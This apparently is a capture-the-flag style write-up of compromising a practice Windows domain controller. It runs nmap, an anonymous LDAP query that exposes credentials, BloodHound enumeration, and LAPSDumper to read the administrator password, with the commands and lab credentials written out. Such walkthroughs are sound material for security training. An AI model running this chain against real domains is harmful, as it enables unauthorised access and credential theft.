```
nmap -sC -sV -p- 192.168.235.122
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 17:23 CDT
Stats: 0:02:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 17:26 (0:00:09 remaining)
Nmap scan report for 192.168.235.122
...
|_  Server Date: Sun, 30 Jul 2023 22:26:55 GMT
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-30 22:26:01Z)
...
Found nothing on the website. Started enumerating with an anonymous ldap bind.

```
ldapsearch -x -b "hutch,dc=offsec" "*" -H ldap://192.168.235.122                          
# extended LDIF
#
# LDAPv3
# base <hutch,dc=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: * 
#
...
text: 0000208F: NameErr: DSID-0310022E, problem 2006 (BAD_NAME), data 8350, bes
 t match of:
        'hutch,dc=offsec'
...
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -b "dc=hutch,dc=offsec" "*" -H ldap://192.168.235.122
# extended LDIF
#
# LDAPv3
...
Found mentions of the credentials:

`fmcsorley:CrabSharkJellyfish192`

Was unable to log in or find anything. Used Bloodhound python to get more details about this user and domain.

```
bloodhound-python -u fmcsorley -p CrabSharkJellyfish192 -ns 192.168.235.122 -d hutch.offsec -c All
...
WARNING: Failed to get service ticket for hutchdc.hutch.offsec, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: [Errno Connection error (hutchdc.hutch.offsec:88)] [Errno -2] Name or service not known
INFO: Done in 00M 08S

```

User  can read the LAPS Password for the administrator account. Found this tool:

https://github.com/n00py/LAPSDumper

```
python3 laps.py -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec
LAPS Dumper - Running at 07-30-2023 22:37:12
HUTCHDC b@i$m90+jf,6vR
```

I was able to login to the device as the administrator account.